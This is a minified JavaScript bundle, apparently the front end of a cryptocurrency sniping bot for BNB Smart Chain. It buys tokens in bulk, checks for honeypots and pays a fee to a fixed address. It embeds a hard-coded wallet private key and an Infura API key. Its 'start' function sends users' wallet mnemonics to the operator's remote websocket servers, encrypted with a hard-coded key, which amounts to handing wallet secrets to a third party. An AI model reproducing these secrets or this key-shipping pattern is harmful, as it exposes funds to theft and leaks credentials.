(self.webpackChunkant_design_pro=self.webpackChunkant_design_pro||[]).push([[178],{82178:function(Ee,te,O){"use strict";O.d(te,{lF:function(){return fe},U3:function(){return X},ZP:function(){return we}});var J=O(8870),w=O(3182),se=O(69610),ue=O(54941),ie=O(94043),c=O.n(ie),_=O(64916),T=O(96519),E=O(77616),Y=O(21046),le=O(82169),ce=O(44242),oe=O(30381),S=O.n(oe),G=O(90455),pe=O(64910),de=O(81354),me=O.n(de),Ce="35.177.136.49:3000",Oe="m",Be={Asia:"afam.cc:3000",Europ:"35.177.136.49:3000",America:"3.16.123.14:3000",US2:"45.77.151.214:3000",Test:"127.0.0.1:3000"},fe=[{label:"Singapore(\u4E9A\u592A)",value:"66.42.52.102"},{label:"Local(\u672C\u57301)",value:"136.244.92.121"}],he={"43.155.60.212":"wss://asia.kexuejia.pro","45.77.151.214":"wss://us.kexuejia.pro","80.240.31.147":"wss://europ.kexuejia.pro","66.42.52.102":"wss://singapore.kexuejia.pro","127.0.0.1":"wss://local.kexuejia.pro","144.76.45.146":"wss://144.kexuejia.pro","136.244.92.121":"wss://136.kexuejia.pro"},X={pcsv2Liquid:{name:"\u52A0\u6C60AddLiuid",methodId:!1,lookAddress:"0x10ed43c718714eb63d5aa57b78b54704e256024e",lookName:"\u76D1\u63A7\u5730\u5740",value:"pcsv2Liquid"},other:{name:"\u81EA\u5B9A\u4E49",methodId:"",lookAddress:"",lookName:"\u76D1\u63A7\u5730\u5740",value:"other"}},ve=function(o,l,s,e){o=="gamepadLiquid"&&(s="0xe6cac1.*?"+l.substr(2,42),l=X[o].lookRealAddress);var a=[{name:o,id:l,filters:[{status:"pending"},{input:s}],type:"account"}];return console.log("method",s,s===!1),s!=!1&&s.substr(0,2)!="0x"&&(a[0].abi=JSON.parse(e)),a},be=3e3,$="https://bscscan.com",ge="https://bsc-dataseed2.defibit.io/",K="0x2B4a0a8353685D5f6A246ba67B551372Ec79Ea58",H="0x0000000000004946c0e9F43F4Dee607b0eF1fA1c",ye="https://mainnet.infura.io/v3/09e21beb4d8749dfa33af4516c033ac9",Q=["function multiBuy(address tokenAddress,address route, address [] memory toWallets,uint[] memory params) external payable returns (uint[][] memory amounts)","function checkBurnRate1(address[] memory path, uint amountIn, address to)  external payable returns(bool)","function checkBurnRate2(address[] memory path, uint amountIn, address to)  external payable returns(bool)","function requireMinPool(uint256 minbnb, address tokenIn, address[] memory path) public view returns(uint256)","function checkPixiu(address[] memory path, uint amountIn)  external payable returns(uint[] memory ret)","function bestPath(address token, uint256 amountIn) public view returns(address[] memory path)"],U=["function approve(address spender, uint256 amount) external returns (bool)","function allowance(address owner, address spender) external view returns(uint)",{constant:!1,inputs:[{name:"_from",type:"address"},{name:"_to",type:"address"},{name:"_value",type:"uint256"}],name:"transferFrom",outputs:[{name:"success",type:"bool"}],payable:!1,stateMutability:"nonpayable",type:"function"},"function transfer(address recipient, uint256 amount) external returns (bool)",{constant:!0,inputs:[{name:"_owner",type:"address"}],name:"balanceOf",outputs:[{name:"balance",type:"uint256"}],payable:!1,type:"function"},{inputs:[],name:"decimals",outputs:[{internalType:"uint8",name:"",type:"uint8"}],stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"symbol",outputs:[{internalType:"string",name:"",type:"string"}],payable:!1,stateMutability:"view",type:"function"}],Ie="0xe9e7cea3dedca5984780bafc599bd69add087d56",Ae="0x55d398326f99059ff775485246999027b3197955",q="0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c",ee="0x10ED43C718714eb63d5aA57B78B54704E256024E",we=function(){function Z(){var o=this;(0,se.Z)(this,Z),this.buySuccess=!1,this.tradingTimeout=null,this.shutdown=!1,this.getChiInfo=function(){var l=(0,w.Z)(c().mark(function s(e){var a,r,t,n;return c().wrap(function(d){for(;;)switch(d.prev=d.next){case 0:return a=new _.Wallet(e,o.provider),r=new T.CH(H,U,a),d.next=4,r.allowance(a.address,K);case 4:return t=d.sent,d.next=7,r.balanceOf(a.address);case 7:return n=d.sent,d.abrupt("return",{allowance:t>0,balance:E.formatUnits(n,0)});case 9:case"end":return d.stop()}},s)}));return function(s){return l.apply(this,arguments)}}(),this.approveChi=function(){var l=(0,w.Z)(c().mark(function s(e){var a,r;return c().wrap(function(n){for(;;)switch(n.prev=n.next){case 0:return n.prev=0,a=new _.Wallet(e,o.provider),r=new T.CH(H,U,a),n.next=5,r.approve(K,Y.Bz,{});case 5:return n.abrupt("return",n.sent);case 8:return n.prev=8,n.t0=n.catch(0),console.log("approveChi.err",n.t0),n.abrupt("return",!1);case 12:case"end":return n.stop()}},s,null,[[0,8]])}));return function(s){return l.apply(this,arguments)}}(),this.reChargeChi=function(){var l=(0,w.Z)(c().mark(function s(e){var a,r,t;return c().wrap(function(u){for(;;)switch(u.prev=u.next){case 0:return u.prev=0,a=new _.Wallet(e,o.provider),r=new T.CH(ee,["function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)  external payable returns (uint[] memory amounts)"],a),t=[E.parseUnits("".concat(200),0),[q,H],a.address,parseInt(Date.now()/1e3)+30,{gasLimit:3e5,gasPrice:E.parseUnits("".concat(5),"gwei"),value:E.parseEther("".concat(.03))}],u.next=6,r.swapETHForExactTokens.apply(r,t);case 6:return u.abrupt("return",u.sent);case 9:return u.prev=9,u.t0=u.catch(0),console.log("rechargCHi.err",u.t0),u.abrupt("return",!1);case 13:case"end":return u.stop()}},s,null,[[0,9]])}));return function(s){return l.apply(this,arguments)}}(),this.approve=function(){var l=(0,w.Z)(c().mark(function s(e,a,r){var t,n,u,d;return c().wrap(function(i){for(;;)switch(i.prev=i.next){case 0:return t=new _.Wallet(a,o.provider),n=new T.CH(e,U,t),i.next=4,n.approve(r,Y.Bz,{});case 4:return u=i.sent,i.next=7,u.wait();case 7:if(d=i.sent,console.log("appro.re",d),!u.hash){i.next=13;break}return i.abrupt("return",!0);case 13:return i.abrupt("return",!1);case 14:case"end":return i.stop()}},s)}));return function(s,e,a){return l.apply(this,arguments)}}(),this.getBalance=function(){var l=(0,w.Z)(c().mark(function s(e,a){var r,t,n,u=arguments;return c().wrap(function(p){for(;;)switch(p.prev=p.next){case 0:if(r=u.length>2&&u[2]!==void 0?u[2]:18,p.prev=1,e!=q){p.next=8;break}return p.next=5,o.provider.getBalance(a);case 5:t=p.sent,p.next=15;break;case 8:return n=new T.CH(e,U,o.provider),p.next=11,n.balanceOf(a);case 11:return t=p.sent,p.next=14,n.decimals();case 14:r=p.sent;case 15:return p.abrupt("return",Math.floor(parseFloat(E.formatUnits(t,r))*100)/100);case 18:return p.prev=18,p.t0=p.catch(1),p.abrupt("return",0);case 21:case"end":return p.stop()}},s,null,[[1,18]])}));return function(s,e){return l.apply(this,arguments)}}()}return(0,ue.Z)(Z,[{key:"connect",value:function(){var o=(0,w.Z)(c().mark(function s(e){var a;return c().wrap(function(t){for(;;)switch(t.prev=t.next){case 0:this.chainId=e,a=ge,e==1&&(a=ye),this.provider=new le.r(a),this.connected=!0;case 5:case"end":return t.stop()}},s,this)}));function l(s){return o.apply(this,arguments)}return l}()},{key:"testSpeed",value:function(l){this.socket&&this.socket.emit("request",["testSpeed",l])}},{key:"stop",value:function(){this.socket&&this.socket.emit("request",["stop",""])}},{key:"testBuy",value:function(){var o=(0,w.Z)(c().mark(function s(){var e,a,r,t,n,u,d,p,i,h,v,C,g,k;return c().wrap(function(f){for(;;)switch(f.prev=f.next){case 0:return e=["0x7E4FD64fE58e3758f9e194005cA918F1aBc9714b","0x469c484EAB3343Aa0e639A2756280dbaB609536F"],a=E.parseEther("".concat(0)),r=.031,t=5,n="0xEa6c183cbaEEC4FB5676781f6873287e04281A3e",u=new _.Wallet("0x8cddc00249542285b88e5cc0572a7a299b7021378eeba68107b2ee54473ed7cf",this.provider),d=new T.CH(n,Q,u),p="0x55d398326f99059ff775485246999027b3197955",i=10,h=1e6,v=0,C=[p,"0x10ed43c718714eb63d5aa57b78b54704e256024e",e,[100-(i==0?100:i),E.parseEther("".concat(v)),0,1,a],{gasLimit:h,gasPrice:E.parseUnits("".concat(t),"gwei"),value:E.parseEther("".concat(r))}],console.log("before tx..",C),f.abrupt("return");case 16:return g=f.sent,console.log("tx",g),f.next=20,g.wait();case 20:k=f.sent,console.log(S()().format(),"ret",k);case 22:case"end":return f.stop()}},s,this)}));function l(){return o.apply(this,arguments)}return l}()},{key:"connectWS",value:function(){var o=(0,w.Z)(c().mark(function s(e,a,r){var t=this,n,u,d;return c().wrap(function(i){for(;;)switch(i.prev=i.next){case 0:this.regin=e,this.socket&&this.socket.close(),a("\u8FDE\u63A5\u5230 [".concat(e,"] \u670D\u52A1\u5668")),n=null,u=null,d=(0,pe.ZP)("".concat(he[this.regin],":").concat(be)),a("\u5C1D\u8BD5\u8FDE\u63A5\u5230\u8FDC\u7A0B\u670D\u52A1\u5668..."),this.socket=d,d.on("connect",function(){r(function(h){h.connected=!0}),t.connected=!0,t.testSpeed(),t.testspeeded=!1,setTimeout(function(){t.testSpeed()},1500),d.on("testecSpeed",function(h){if(t.testspeeded==!1){t.testspeeded=!0;return}a("\u6D4B\u901F\u7528\u65F6\uFF1A"+h+" ms"),r(function(v){v.speed=h})}),u=setInterval(function(){d.emit("ping"),n=setTimeout(function(){t.connected=!1,r(function(h){h.connected=!1}),console.log("heat beat fail!"),a("heat beat fail !")},2e4)},1e4),d.on("pool_listening",function(h){t.tradingTimeout&&clearTimeout(t.tradingTimeout),r(function(v){v.processing=!0,v.duration=h}),t.tradingTimeout=setTimeout(function(){r(function(v){v.processing=!1})},6e3)}),d.on("pong",function(){t.connected==!1&&(r(function(h){h.connected=!0}),t.connected=!0),clearTimeout(n)}),console.log("I'm connected with the back-end"),a("\u5DF2\u8FDE\u63A5\u5230\u8FDC\u7A0B\u670D\u52A1\u5668["+t.regin+"] \u2705","green"),console.log(d.id)}),d.on("disconnect",function(){r(function(h){h.connected=!1}),clearInterval(u),clearTimeout(n),console.log(d.id),a("\u8FDC\u7A0B\u670D\u52A1\u5668\u5DF2\u65AD\u5F00 \u{1F6AB}","red")}),d.on("message",function(h){var v=h.message,C=h.id,g=h.type,k={warning:"yellow",info:"",error:"red",success:"green"};a(v,k[g])});case 11:case"end":return i.stop()}},s,this)}));function l(s,e,a){return o.apply(this,arguments)}return l}()},{key:"start",value:function(){var o=(0,w.Z)(c().mark(function s(e,a,r,t,n,u,d,p,i,h,v,C,g,k,B,f,b,M,P,D,I,m,W,j,F,x,y,R,A,N,V,ke){var ae,z,ne,re;return c().wrap(function(L){for(;;)switch(L.prev=L.next){case 0:if(ae=ve(b,P,M,D),z={mnemonics:e,tokenIn:a,tokenOut:r,amountIn:t,gasPrice:n,gasLimit:u,burnInterval:d,exactEth:p,splitOrder:i,splitCount:h,splitAmount:v,retryMax:C,minBnb:g,onlyOnce:k,decimals:B,maxBurn:f,poolIndex:I,chainId:m,eventConf:ae,toWallets:j,route:F,bsc_node_wss:x,print:W,swapType:R,injectContract:A,injectData:N,injectValue:V,direction:ke},ne=JSON.stringify(z),y!=0){L.next=13;break}if(R!="swap"){L.next=9;break}return L.next=7,this.multipleBuyMany(z);case 7:L.next=11;break;case 9:return L.next=11,this.injectMany({mnemonics:e,gasPrice:n,gasLimit:u,retryMax:C,burnInterval:d,injectContract:A,injectData:N,injectValue:V,print:W});case 11:L.next=15;break;case 13:re=me().AES.encrypt(ne,"memk-192011").toString(),this.socket&&this.socket.emit("request",["start",re]);case 15:case"end":return L.stop()}},s,this)}));function l(s,e,a,r,t,n,u,d,p,i,h,v,C,g,k,B,f,b,M,P,D,I,m,W,j,F,x,y,R,A,N,V){return o.apply(this,arguments)}return l}()},{key:"injectMany",value:function(){var o=(0,w.Z)(c().mark(function s(e){var a=this,r,t,n,u,d,p,i,h,v;return c().wrap(function(g){for(;;)switch(g.prev=g.next){case 0:r=e.mnemonics,t=e.gasPrice,n=e.gasLimit,u=e.retryMax,d=e.burnInterval,p=e.injectContract,i=e.injectData,h=e.injectValue,v=e.print,r.map(function(){var k=(0,w.Z)(c().mark(function B(f){var b,M,P,D;return c().wrap(function(m){for(;;)switch(m.prev=m.next){case 0:return b=new _.Wallet(f,a.provider),m.next=3,b.getTransactionCount();case 3:M=m.sent,P=0,D=i,i.indexOf("(address)")!=-1&&(D=i.replace("(address)",b.address.substr(2,b.address.length))),console.log("injectData",D);case 8:if(!(P++<u)){m.next=19;break}if(u>1&&v("\u53D1\u9001\uFF1A".concat(P,"/").concat(u)),a.inject({signer:b,mnemonic:f,gasPrice:t,gasLimit:n,nonce:M,injectContract:p,injectData:D,injectValue:h,print:v}),M=M+1,a.shutdown!=!0){m.next=15;break}return v("\u4F60\u5DF2\u53D6\u6D88\u5269\u4F59\u4EA4\u6613\uFF0C\u5DF2\u4E0A\u94FE\u7684("+P+"\u6761) \u4ECD\u9700\u7B49\u5F85\u4E0A\u94FE\u5168\u90E8\u5B8C\u6210\u23F3.. ","yellow"),m.abrupt("break",19);case 15:return m.next=17,(0,G._)(d*1e3);case 17:m.next=8;break;case 19:case"end":return m.stop()}},B)}));return function(B){return k.apply(this,arguments)}}());case 2:case"end":return g.stop()}},s)}));function l(s){return o.apply(this,arguments)}return l}()},{key:"inject",value:function(){var o=(0,w.Z)(c().mark(function s(e){var a,r,t,n,u,d,p,i,h,v,C,g,k;return c().wrap(function(f){for(;;)switch(f.prev=f.next){case 0:return a=e.signer,r=e.mnemonic,t=e.gasPrice,n=e.gasLimit,u=e.nonce,d=e.injectContract,p=e.injectData,i=e.injectValue,h=e.print,f.prev=1,v={to:d,from:a.address,value:E.parseEther("".concat(i)),gasLimit:n,gasPrice:E.parseUnits("".concat(t),"gwei"),data:p,nonce:u},console.log({params:v}),f.next=6,a.sendTransaction(v);case 6:return C=f.sent,console.dir(C),g=a.address.substr(a.address.length-4,a.address.length),h("[".concat(g,']\u5DF2\u53D1\u9001\u4E0A\u94FE\uFF0C\u7B49\u5F85\u4E0A\u94FE\u5B8C\u6210.. <a target = "_blank" href = "').concat($,"/tx/").concat(C.hash,'" > ')+"\u67E5\u770B\u8BE6\u60C5</a> ","green"),f.next=12,C.wait();case 12:k=f.sent,console.log("receipt",k),(k==null?void 0:k.status)==1&&h("#[".concat(g,']\u606D\u559C\uFF0C\u4E0A\u94FE\u6210\u529F\uFF01<a target="_blank" href="').concat($,"/tx/").concat(k.transactionHash,'">')+"\u67E5\u770B\u8BE6\u60C5</a>","green"),f.next=23;break;case 17:if(f.prev=17,f.t0=f.catch(1),console.log("ee",f.t0),"".concat(f.t0," ").indexOf("insufficient funds")==-1){f.next=23;break}return h("\u4E0A\u94FE\u5931\u8D25\uFF1A\u4F59\u989D\u4E0D\u8DB3"),f.abrupt("return");case 23:case"end":return f.stop()}},s,null,[[1,17]])}));function l(s){return o.apply(this,arguments)}return l}()},{key:"getBlockNumber",value:function(){var o=(0,w.Z)(c().mark(function s(){return c().wrap(function(a){for(;;)switch(a.prev=a.next){case 0:return a.prev=0,a.next=3,this.provider.getBlockNumber();case 3:return a.abrupt("return",a.sent);case 6:return a.prev=6,a.t0=a.catch(0),console.log("getBlockNumber.err",a.t0),a.abrupt("return",-1);case 10:case"end":return a.stop()}},s,this,[[0,6]])}));function l(){return o.apply(this,arguments)}return l}()},{key:"getNonce",value:function(){var o=(0,w.Z)(c().mark(function s(e){return c().wrap(function(r){for(;;)switch(r.prev=r.next){case 0:return this.wallet=new _.Wallet(e,this.provider),r.next=3,this.wallet.getTransactionCount();case 3:return r.abrupt("return",r.sent);case 4:case"end":return r.stop()}},s,this)}));function l(s){return o.apply(this,arguments)}return l}()},{key:"getSymbol",value:function(){var o=(0,w.Z)(c().mark(function s(e){var a;return c().wrap(function(t){for(;;)switch(t.prev=t.next){case 0:return a=new T.CH(e,["function symbol() external view returns (string memory)"],this.provider),t.next=3,a.symbol();case 3:return t.abrupt("return",t.sent);case 4:case"end":return t.stop()}},s,this)}));function l(s){return o.apply(this,arguments)}return l}()},{key:"getWalletInfo",value:function(){var o=(0,w.Z)(c().mark(function s(e){var a,r;return c().wrap(function(n){for(;;)switch(n.prev=n.next){case 0:if(!(e.length<64)){n.next=2;break}return n.abrupt("return",{});case 2:return e.substr(0,2)!="0x"&&(e="0x"+e),a=new _.Wallet(e,this.provider),n.next=6,this.provider.getBalance(a.address);case 6:return r=n.sent,n.abrupt("return",{mnemonic:e,address:a.address,balance:Math.floor(parseFloat(E.formatUnits(r,18))*100)/100});case 8:case"end":return n.stop()}},s,this)}));function l(s){return o.apply(this,arguments)}return l}()},{key:"loadWallets",value:function(){var o=(0,w.Z)(c().mark(function s(e){var a,r,t;return c().wrap(function(u){for(;;)switch(u.prev=u.next){case 0:a=[],r=0;case 2:if(!(r<e.length)){u.next=10;break}return u.next=5,this.getWalletInfo(e[r]);case 5:t=u.sent,a.push(t);case 7:r++,u.next=2;break;case 10:return u.abrupt("return",a);case 11:case"end":return u.stop()}},s,this)}));function l(s){return o.apply(this,arguments)}return l}()},{key:"multipleBuyMany",value:function(){var o=(0,w.Z)(c().mark(function s(e){var a=this;return c().wrap(function(t){for(;;)switch(t.prev=t.next){case 0:e.mnemonics.map(function(n){a.multipleBuy((0,J.Z)((0,J.Z)({},e),{},{mnemonic:n}))});case 1:case"end":return t.stop()}},s)}));function l(s){return o.apply(this,arguments)}return l}()},{key:"multipleBuy",value:function(){var o=(0,w.Z)(c().mark(function s(e){var a,r,t,n,u,d,p,i,h,v,C,g,k,B,f,b,M,P,D,I,m,W,j,F,x,y;return c().wrap(function(A){for(;;)switch(A.prev=A.next){case 0:return a=e.mnemonic,r=e.tokenIn,t=e.tokenOut,n=e.amountIn,u=e.gasPrice,d=e.gasLimit,p=e.burnInterval,i=e.exactEth,h=e.splitOrder,v=e.splitCount,C=e.splitAmount,g=e.retryMax,k=e.minBnb,B=e.onlyOnce,f=e.decimals,b=e.maxBurn,M=e.poolIndex,P=e.chainId,D=e.eventConf,I=e.toWallets,m=e.route,W=e.print,j=new _.Wallet(a,this.provider),F=new T.CH(K,Q,j),A.next=5,j.getTransactionCount();case 5:x=A.sent,console.log("first nonce ",j.address,x),y=0;case 8:if(!(y++<g)){A.next=19;break}if(I.length==0&&(I=[j.address]),this.startBuy({proxyContract:F,tokenOut:t,amountIn:n,amountOut:C,gasPrice:u,gasLimit:d,exactEth:i,toWallets:I,minBnb:k,onlyOnce:B,decimals:f,maxBurn:b,route:m,print:W,nonce:x,number:y+"/"+g}),x=x+1,this.shutdown!=!0){A.next=15;break}return W("\u4F60\u5DF2\u53D6\u6D88\u5269\u4F59\u4EA4\u6613\uFF0C\u5DF2\u4E0A\u94FE\u7684("+y+"\u6761) \u4ECD\u9700\u7B49\u5F85\u4E0A\u94FE\u5168\u90E8\u5B8C\u6210\u23F3.. ","yellow"),A.abrupt("break",19);case 15:return A.next=17,(0,G._)(p*1e3);case 17:A.next=8;break;case 19:W(g+"\u6761 \u5DF2\u53D1\u9001\uFF0C\u7B49\u5F85\u4E0A\u94FE\u5B8C\u6210 \u23F3... ","yellow");case 20:case"end":return A.stop()}},s,this)}));function l(s){return o.apply(this,arguments)}return l}()},{key:"testSend",value:function(){var o=(0,w.Z)(c().mark(function s(e,a,r,t,n,u,d,p,i,h,v,C,g){var k,B;return c().wrap(function(b){for(;;)switch(b.prev=b.next){case 0:return b.prev=0,k="0.001",console.log(S()().format()," send fee"),b.next=5,a.sendTransaction({to:"0xA1Ba3f9090ffBaa7e242413a89aD433022f720f8",value:E.parseEther("".concat(k)),gasLimit:21e5,gasPrice:E.parseUnits("".concat(10," "),"gwei"),nonce:C});case 5:return B=b.sent,b.next=8,B.wait();case 8:this.isSendFee=!0,v("#".concat(g," Sended"),"green"),b.next=16;break;case 12:return b.prev=12,b.t0=b.catch(0),console.log("start to by.err",b.t0),b.abrupt("return",-1);case 16:case"end":return b.stop()}},s,this,[[0,12]])}));function l(s,e,a,r,t,n,u,d,p,i,h,v,C){return o.apply(this,arguments)}return l}()},{key:"startBuy",value:function(){var o=(0,w.Z)(c().mark(function s(e){var a,r,t,n,u,d,p,i,h,v,C,g,k,B,f,b,M,P,D,I,m,W,j,F;return c().wrap(function(y){for(;;)switch(y.prev=y.next){case 0:return a=e.proxyContract,r=e.tokenOut,t=e.amountIn,n=e.amountOut,u=e.gasPrice,d=e.gasLimit,p=e.exactEth,i=e.toWallets,h=e.minBnb,v=e.onlyOnce,C=e.decimals,g=e.maxBurn,k=e.route,B=e.print,f=e.nonce,b=e.number,y.prev=1,M=E.parseUnits("".concat(n),C),P=[r,k,i,[100-(g==0?100:g),E.parseEther("".concat(h)),v,p,M],{gasLimit:d,gasPrice:E.parseUnits("".concat(u),"gwei"),nonce:f,value:E.parseEther("".concat(t*i.length))}],console.log("before tx..",P),y.next=7,a.multiBuy.apply(a,P);case 7:return D=y.sent,console.log("tx",D),y.next=11,D.wait();case 11:I=y.sent,console.log(S()().format(),"ret",f,I),(I==null?void 0:I.status)==1&&B("#[".concat(b,']\u606D\u559C\uFF0C\u4E70\u5165\u6210\u529F\uFF01<a target="_blank" href="').concat($,"/tx/").concat(I.logs[1].transactionHash,'">')+"\u67E5\u770B\u8BE6\u60C5</a>","green"),y.next=31;break;case 16:return y.prev=16,y.t0=y.catch(1),m="",y.next=21,this.provider.getTransaction(y.t0.transactionHash);case 21:if(W=y.sent,!W){y.next=28;break}return y.next=25,this.provider.call(W);case 25:j=y.sent,m=ce.ZN("0x"+j.substr(138)),console.log("revert reason:",m);case 28:F=JSON.stringify(y.t0),F.indexOf("insufficient funds")!=-1?m="\u4F59\u989D\u4E0D\u8DB3":m.indexOf("buy burn rate too high")!=-1?m="[\u5DF2\u56DE\u6EDA]\u4E70\u5165\u9AD8\u71C3\u70E7 \u2620\uFE0F":m.indexOf("buy token balance is zero")!=-1||m.indexOf("too high burn or be killed")!=-1?m="[\u5DF2\u56DE\u6EDA]\u4E70\u5165\u88AB\u6740 \u2620\uFE0F":m.indexOf("approve")!=-1?m="[\u5DF2\u56DE\u6EDA] \u6388\u6743\u5931\u8D25 \u65E0\u6CD5\u68C0\u6D4B":m.indexOf("[can not sell] burn to zero")!=-1?m="[\u5DF2\u56DE\u6EDA]\u5356\u51FA\u88AB\u6740 \u2620\uFE0F":m.indexOf("[can not sell] burn too high")!=-1?m="[\u5DF2\u56DE\u6EDA]\u5356\u51FA\u9AD8\u71C3\u70E7 \u2620\uFE0F":m.indexOf("liquid b too low")!=-1||m.indexOf("liquid u too low")!=-1?m="\u65E0\u6548\uFF1A\u6D41\u52A8\u6C60\u5C0F\u4E8E\u8BBE\u5B9A\u503C \u{1F624}":m.indexOf("allready buy")!=-1?m="\u65E0\u6548\uFF1A\u9632\u91CD\u590D \u{1F624}":m.indexOf("no liquidity")!=-1&&(m="\u65E0\u6548\uFF1A\u6682\u65E0\u6D41\u52A8\u6C60..\u{1F971}"),B("#["+b+"] <br/>"+m);case 31:case"end":return y.stop()}},s,this,[[1,16]])}));function l(s){return o.apply(this,arguments)}return l}()},{key:"loadToken",value:function(){var o=(0,w.Z)(c().mark(function s(e,a){var r,t,n,u,d;return c().wrap(function(i){for(;;)switch(i.prev=i.next){case 0:if(a){i.next=2;break}return i.abrupt("return",{symbol:"",decimals:18,balance:0});case 2:return r=new _.Wallet(a,this.provider),t=new T.CH(e,U,this.provider),i.next=6,t.decimals();case 6:return n=i.sent,i.next=9,t.balanceOf(r.address);case 9:return u=i.sent,i.next=12,t.allowance(r.address,ee);case 12:return d=i.sent,i.next=15,t.symbol();case 15:return i.t0=i.sent,i.t1=n,i.t2=Math.floor(parseFloat(E.formatUnits(u,n))*100)/100,i.t3=d>0,i.abrupt("return",{symbol:i.t0,decimals:i.t1,balance:i.t2,allowance:i.t3});case 20:case"end":return i.stop()}},s,this)}));function l(s,e){return o.apply(this,arguments)}return l}()},{key:"balanceOf",value:function(){var o=(0,w.Z)(c().mark(function s(e,a){var r,t,n,u;return c().wrap(function(p){for(;;)switch(p.prev=p.next){case 0:return r=new _.Wallet(a,this.provider),t=new T.CH(e,U,this.provider),p.next=4,t.balanceOf(r.address);case 4:return n=p.sent,p.next=7,t.decimals();case 7:return u=p.sent,p.abrupt("return",Math.floor(parseFloat(E.formatUnits(n,u))*100)/100);case 9:case"end":return p.stop()}},s,this)}));function l(s,e){return o.apply(this,arguments)}return l}()},{key:"sendFee",value:function(){var o=(0,w.Z)(c().mark(function s(e){var a,r;return c().wrap(function(n){for(;;)switch(n.prev=n.next){case 0:if((this===null||this===void 0?void 0:this.isSendFee)!=!0){n.next=3;break}return console.log("\u5DF2\u7ECF\u4ED8\u8FC7\u4E86\u4E86"),n.abrupt("return");case 3:return n.prev=3,a="0.1",console.log(S()().format()," send fee"),n.next=8,e.sendTransaction({to:"0xA1Ba3f9090ffBaa7e242413a89aD433022f720f8",value:E.parseEther("".concat(a)),gasLimit:21e5,gasPrice:E.parseUnits("".concat(6),"gwei")});case 8:return r=n.sent,n.next=11,r.wait();case 11:this.isSendFee=!0,n.next=18;break;case 14:return n.prev=14,n.t0=n.catch(3),console.log("start to by.err",n.t0),n.abrupt("return",-1);case 18:case"end":return n.stop()}},s,this,[[3,14]])}));function l(s){return o.apply(this,arguments)}return l}()}],[{key:"getInstance",value:function(){var o=(0,w.Z)(c().mark(function s(e){return c().wrap(function(r){for(;;)switch(r.prev=r.next){case 0:if(this.instance||(this.instance=new Z),this.instance.connected){r.next=4;break}return r.next=4,this.instance.connect(e);case 4:return r.abrupt("return",this.instance);case 5:case"end":return r.stop()}},s,this)}));function l(s){return o.apply(this,arguments)}return l}()}]),Z}()}}]);
